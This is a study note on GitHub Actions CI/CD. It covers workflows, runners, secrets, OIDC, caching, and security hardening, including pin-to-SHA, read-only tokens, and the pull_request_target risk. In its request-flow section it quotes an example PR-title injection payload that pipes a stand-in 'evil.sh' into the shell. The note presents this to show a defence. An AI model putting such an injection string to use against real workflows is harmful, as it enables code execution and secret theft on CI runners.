# GitHub Actions

> **In one line —** CI/CD that lives in the same repository as the code, which is its greatest convenience and its main security hazard.

| | |
|---|---|
| **Category** | CI/CD Platform |
| **Architectural Layer** | Delivery |
| **Related notes** | [CI CD](CI%20CD.md) · [GitHub](GitHub.md) · [Git](Git.md) · [Docker](Docker.md) · [IAM](../12%20-%20Cloud%20Architecture/IAM.md) · [Deployment Strategies](Deployment%20Strategies.md) |

---

## 1. Short Definition

*What is it?*

GitHub Actions runs **workflows** — YAML files in `.github/workflows/` — in response to repository events. Each workflow contains jobs; each job runs on a fresh runner; each job is a series of steps that are either shell commands or reusable **actions**.

---

## 2. Problem

*What engineering problem does it solve?*

```text
The old shape
    a Jenkins server somebody set up in 2016
    its configuration lives in the UI, not in version control
    plugins nobody dares upgrade
    a queue, and one machine everyone shares
    ↓
Pipeline configuration was not reviewable, not versioned,
and not connected to the change that needed it
```

Actions puts the pipeline **in the repository, on the same branch as the code it builds**. A pull request that changes the build also changes the build definition, reviewed together.

> [!IMPORTANT]
> **Pipeline-as-code in the repository is the real shift, and the marketplace is the second one.** Because a workflow is a file on a branch, changing CI is a normal pull request rather than a privileged operation — and because actions are shareable, most common steps are one line instead of a script. Both are genuine improvements. Both also mean **your pipeline now executes other people's code with access to your secrets**, which is the trade-off running through this note.

---

## 3. Architecture Position

```text
EVENT                     WORKFLOW                       RUNNER
push, pull_request,   →   .github/workflows/*.yml   →    ubuntu-latest
schedule, tag,             jobs:                          fresh VM per job
workflow_dispatch,           steps: run | uses            2 vCPU, 7 GB (free tier)
repository_dispatch                                        or self-hosted
                              │
                    ┌─────────┴──────────┐
                    ▼                    ▼
              secrets / vars      OIDC token → cloud role
                    │                    │
                    ▼                    ▼
              registry (GHCR)      deploy to environment
```

---

## 4. The anatomy of a workflow

```yaml
name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read              # default to the minimum, escalate per job

concurrency:                  # cancel superseded runs on the same branch
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4     # pin to a SHA in production workflows
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'                # caching is one line and often halves the run
      - run: npm ci
      - run: npm test
```

```text
JOBS run in PARALLEL by default          → use `needs:` to sequence
each JOB gets a CLEAN runner             → nothing persists between jobs
share files between jobs with ARTIFACTS  → not with the filesystem
```

> [!TIP]
> **Set `permissions: contents: read` at the top of every workflow and escalate per job.** The default token is broadly scoped, and a compromised step inherits whatever it has. This one line, plus `concurrency` to cancel superseded runs, are the two highest-value additions to almost any existing workflow.

---

## 5. Runners

```text
GITHUB-HOSTED
    fresh VM every job, nothing leaks between runs
    free minutes on public repos; billed per minute on private
    2 vCPU by default; larger runners cost more
    no access to your private network

SELF-HOSTED
    your hardware, your network — can reach internal systems
    no per-minute cost, and much faster with warm caches
    ⚠ YOU own isolation, patching and cleanup
```

> [!CAUTION]
> **Never attach a persistent self-hosted runner to a public repository.** Anyone who opens a pull request can execute code on it, and because the machine is reused, one run can leave behind credentials, poisoned caches or a modified toolchain for the next. If you need self-hosted runners, make them ephemeral — a fresh VM or container per job, destroyed afterwards.

---

## 6. Secrets, variables and OIDC

```text
SECRETS       encrypted, masked in logs, available to workflows
VARIABLES     non-sensitive configuration
ENVIRONMENTS  scoped secrets + required reviewers + deployment history

OIDC — the one that matters
    the workflow requests a short-lived token from GitHub
    your cloud trusts it for a SPECIFIC repo, branch and environment
    → NOTHING is stored, nothing to rotate, nothing to leak
```

> [!IMPORTANT]
> **OIDC eliminates the largest credential risk in CI, and it takes an afternoon to set up.** A stored cloud access key in repository secrets can be exfiltrated by any step, any dependency or any third-party action in that workflow. An OIDC trust policy scoped to `repo:org/name:ref:refs/heads/main` cannot be used from a fork, a branch or a laptop. See [IAM](../12%20-%20Cloud%20Architecture/IAM.md).

> [!CAUTION]
> **Masking is not protection.** GitHub replaces known secret values with `***` in logs, but a step can trivially transform a secret — base64, reverse, split — and print it unmasked. Log masking guards against accidents, not against malicious code.

---

## 7. The `pull_request_target` trap

```text
pull_request              runs the FORK's code
                          NO secrets, read-only token          ← safe default

pull_request_target       runs the BASE branch's workflow
                          WITH secrets and a write token
                          in the context of an untrusted PR    ← dangerous
```

> [!CAUTION]
> **`pull_request_target` combined with checking out the pull request's head is a remote code execution path into your repository, and it has been exploited in real projects.** If you need it — usually to label or comment on fork pull requests — do not check out the untrusted code, and keep the job to metadata only. The safe pattern for building fork code is a separate workflow triggered by `workflow_run`, with secrets confined to the trusted side.

---

## 8. Making it fast

```text
CACHE          actions/cache, or the `cache:` option on setup-* actions
               → dependency installs are usually the biggest single win

PARALLELISE    a matrix across versions or test shards
               strategy: matrix: shard: [1,2,3,4]

SHALLOW CLONE  the default checkout is already shallow — keep it that way

DOCKER LAYERS  BuildKit with a registry cache; order layers by change frequency

CONCURRENCY    cancel superseded runs instead of paying for them

PATH FILTERS   do not run the whole suite when only docs changed
```

> [!TIP]
> **Caching plus a test matrix routinely takes a pipeline from twenty minutes to five.** These are configuration changes rather than engineering ones. The order that matters most is: cache dependencies, shard the slowest suite, add `concurrency`, then filter by path. Do them in that order and stop when the pipeline is comfortably under ten minutes.

---

## 9. Real World Example

- **The standard pull request pipeline** — lint, type check, test, build, scan.
- **Container build and push to GHCR**, tagged with the commit SHA.
- **Deployment via OIDC** to AWS, with the production environment requiring a reviewer.
- **Scheduled maintenance** — nightly dependency audits, stale-issue cleanup, database backups verified.
- **Release automation** — a tag builds binaries for several platforms in a matrix and attaches them to the release.
- **Terraform plan on pull request, apply on merge**, with the plan posted as a comment; see [Terraform](Terraform.md).

---

## 10. Communication and Dependencies

- **A GitHub repository** — Actions is not usable independently of it
- **Required status checks** in branch protection, or a green pipeline means nothing; see [GitHub](GitHub.md)
- **A registry** — GHCR, ECR or another
- **An OIDC trust relationship** with your cloud provider
- **Environments** for approvals and scoped deployment secrets
- **A cache**, or you pay for the same dependency install every run

---

## 11. When To Use / When NOT To Use

> [!TIP]
> Use Actions if your code is on GitHub. The integration is tight, the marketplace saves real time, and having the pipeline on the same branch as the code is worth more than most feature comparisons.

> [!CAUTION]
> - **Not for very long-running jobs** — a 6-hour job limit and per-minute billing make heavy compute expensive here
> - **Not for GPU or specialised hardware** without self-hosted runners
> - **Not as a general-purpose scheduler** — scheduled workflows are best-effort and can be delayed, and are disabled on inactive repositories
> - **Not for complex multi-stage deployment orchestration** — Argo CD or a dedicated tool fits better; see [Kubernetes](Kubernetes.md)
> - **Not with persistent self-hosted runners on public repositories**, ever
> - **Not as a monorepo build system** at large scale — Bazel or Nx handles dependency-aware builds far better

---

## 12. Advantages and Disadvantages

**Advantages**
- Pipeline lives with the code and is reviewed with it
- No CI server to operate
- An enormous marketplace of ready-made steps
- OIDC deployment with no stored cloud credentials
- Matrix builds across versions and platforms in a few lines
- Environments with approvals and deployment history built in
- Free for public repositories

**Disadvantages**
- **Third-party actions execute arbitrary code with access to your secrets**
- YAML grows unwieldy; the expression syntax is awkward
- Debugging is a slow push-and-observe loop
- Limited reuse — composite and reusable workflows help, but only somewhat
- Hosted runners are modest, and larger ones cost noticeably more
- Scheduled workflows are unreliable for anything time-critical
- Lock-in to GitHub as both host and pipeline
- Self-hosted runners are easy to configure insecurely

---

## 13. Performance Impact

| Aspect | Impact |
|---|---|
| **Job startup** | Roughly 10–30 seconds per job for a fresh runner |
| **Caching** | Often the difference between 8 minutes and 2 |
| **Matrix** | Wall-clock scales down almost linearly with shards |
| **Docker builds** | Layer caching is the dominant factor; use a registry cache |
| **Artifact upload** | Slow for large artefacts; compress and be selective |
| **Queue time** | Hosted runners can queue at peak; self-hosted removes it |
| **Concurrency limits** | Organisation-level caps throttle large monorepos |

> [!TIP]
> **Do not use one huge job.** Jobs run in parallel for free, and splitting lint, test and build lets three things fail independently and quickly. The counter-force is job startup overhead, so the useful granularity is a handful of jobs, not thirty.

---

## 14. Security Considerations

> [!CAUTION]
> **`uses: some-action@v3` is a mutable tag pointing at code you do not control, executing inside a job that holds your secrets.** A maintainer can move that tag, and account compromises of popular actions have happened. Pin to a full commit SHA — `uses: org/action@a1b2c3d...` — and use Dependabot to update those pins deliberately. This is the single most important security practice in Actions.

- **`permissions: contents: read` by default**, escalated per job
- **Pin actions to a SHA**; prefer verified publishers and read what you adopt
- **OIDC instead of stored cloud credentials**
- **Never `pull_request_target` with a checkout of untrusted code**
- **Ephemeral self-hosted runners only**, never on public repositories
- **Do not interpolate untrusted input into `run:`** — a PR title containing shell metacharacters is an injection vector; pass values through `env:` instead
- **Environments with required reviewers** for production
- **Secret scanning and push protection** on the repository; see [GitHub](GitHub.md)
- **Review workflow file changes as carefully as production code** — they are production access

---

## 15. Mental Model

> [!NOTE]
> **A workflow is a recipe pinned to the fridge in the kitchen it belongs to.**
>
> Anyone changing the dish also changes the recipe, in the same envelope, reviewed together. The kitchen is cleaned completely between dishes, which is why nothing carries over unless you deliberately hand it across. And the recipe is allowed to say "use this sauce from the shop" — convenient, and precisely why you should care who made the sauce and whether the jar has been swapped since you last looked.

---

## 16. Mini Architecture Diagram

```text
   pull_request event
          │
   ┌──────▼──────────────────────────────────────────────┐
   │  permissions: contents: read                         │
   │  concurrency: cancel superseded runs                 │
   │                                                       │
   │  ┌── job: lint ──┐ ┌── job: test ─────┐ ┌─ job: scan ┐│
   │  │ fresh runner  │ │ matrix shard 1-4 │ │ trivy      ││
   │  │ 30 s          │ │ cached deps      │ │ gitleaks   ││
   │  └───────────────┘ └──────────────────┘ └────────────┘│
   │            all parallel — independent failures         │
   │                        │ needs:                        │
   │              ┌─────────▼──────────┐                    │
   │              │ job: build         │                    │
   │              │ image:<sha> → GHCR │                    │
   │              └─────────┬──────────┘                    │
   └────────────────────────┼──────────────────────────────┘
                            │ on push to main
                 ┌──────────▼───────────┐
                 │ environment: prod    │
                 │ required reviewer    │
                 │ OIDC → cloud role    │  ← no stored keys
                 └──────────┬───────────┘
                            ▼
                       deployment
```

---

## 17. Complete Request Flow

```text
Developer opens a pull request
    ↓
Concurrency cancels the previous run on the same branch
    ↓
Three jobs start in parallel on fresh runners
    lint (30 s) · test matrix, 4 shards, cached deps (3 min) · scan (1 min)
    ↓
The test job restores the npm cache — the install takes 8 s instead of 90
    ↓
All green → the build job runs, producing image:<commit-sha> in GHCR
    ↓
Required status checks satisfied → review → merge to main
    ↓
The push-to-main workflow triggers deployment to the production environment
    ↓
Environment protection pauses for a required reviewer
    ↓
Approved → the job requests an OIDC token from GitHub
    ↓
AWS validates it against a trust policy naming this repo AND refs/heads/main
    ↓
A 1-hour role session is issued; the deployment runs; nothing was stored
    ↓
Deployment recorded in the environment's history
    ↓
─────────────── an attempted supply chain attack ───────────────
A popular action's v3 tag is moved to malicious code
    ↓
Your workflow pinned it to a SHA → the change has no effect on you
    ↓
Dependabot proposes the update as a reviewable pull request instead
    ↓
─────────────── an attempted injection ───────────────
A fork opens a PR titled: `"; curl evil.sh | sh; #`
    ↓
The workflow passes the title through `env:` rather than interpolating it
into a `run:` block → it is data, not code
    ↓
And the fork's job has no secrets and a read-only token anyway
```

---

## 18. Key Takeaway

> [!IMPORTANT]
> Pin actions to commit SHAs, default the token to read-only, deploy with OIDC rather than stored keys, cache dependencies, and never run untrusted code in a job that holds secrets.

---

## 19. Common Mistakes

- **Third-party actions pinned to tags** rather than commit SHAs
- **Stored cloud credentials** where OIDC would work
- **`pull_request_target` with a checkout of the PR head** — remote code execution
- **Interpolating untrusted input into `run:`**, allowing shell injection
- **Persistent self-hosted runners on public repositories**
- **No caching**, paying for the same install on every run
- **One enormous job**, so everything fails together and slowly
- **No `concurrency` block**, so five superseded runs finish anyway
- **Default write permissions** on the workflow token
- **Checks that exist but are not required** in branch protection
- **Relying on `schedule:`** for anything time-sensitive
- **Assuming log masking protects secrets** from deliberate exfiltration
- **Copying a workflow between repositories** and never revisiting it

---

## 20. Open Source Technologies

- **act** — run workflows locally; shortens the push-and-observe loop considerably
- **actionlint** — lints workflow YAML and catches injection patterns
- **Dependabot / Renovate** — keep pinned action SHAs updated deliberately
- **BuildKit / buildx** — fast, cached container builds with a registry cache
- **Trivy**, **Grype**, **gitleaks**, **Checkov** — scanning steps worth having
- **cosign / Sigstore** — sign images in the pipeline, verify at deploy
- **actions-runner-controller** — ephemeral self-hosted runners on Kubernetes
- **reusable workflows and composite actions** — the built-in answer to YAML duplication

---

## 21. Personal Notes

*Fill this in yourself after finishing the lesson.*

- **Things I learned:**
- **Questions I still have:**
- **To research later:**

---

## 22. Workbook Exercise

- [ ] Add `permissions: contents: read` and a `concurrency` block to one workflow.
- [ ] Replace every third-party action tag with a pinned commit SHA.
- [ ] Add dependency caching and measure the before-and-after run time.
- [ ] Replace one stored cloud secret with an OIDC role scoped to a single branch.
- [ ] Search your workflows for `${{ github.event...}}` inside a `run:` block.

---

# Standard Lesson Summary

## 1. Mini Architecture Map

```text
event → workflow YAML in the repo → parallel jobs on fresh runners → artefact
                                                          └→ OIDC → deployment
```

## 2. Request Flow

```text
Input       a repository event and a workflow file on that branch
    ↓
Processing  jobs on clean runners, in parallel, with cached dependencies
    ↓
Output      status checks, an immutable artefact, and a credential-free deployment
```

## 3. Real-World Usage

Actions became the default because the pipeline sits beside the code, and the marketplace removes most boilerplate. The teams that run it safely converge on the same short list: SHA-pinned actions, a read-only default token, OIDC deployment, and no untrusted code in any job that can see a secret.

## 4. Final Summary

| Question | Answer |
|---|---|
| **What is it?** | Event-driven CI/CD defined as YAML in the repository itself |
| **Why does it exist?** | So the pipeline is versioned and reviewed with the code it builds |
| **Where does it belong?** | Between a pull request and a deployment |
| **When should I use it?** | Whenever your code is on GitHub — with the security defaults corrected |
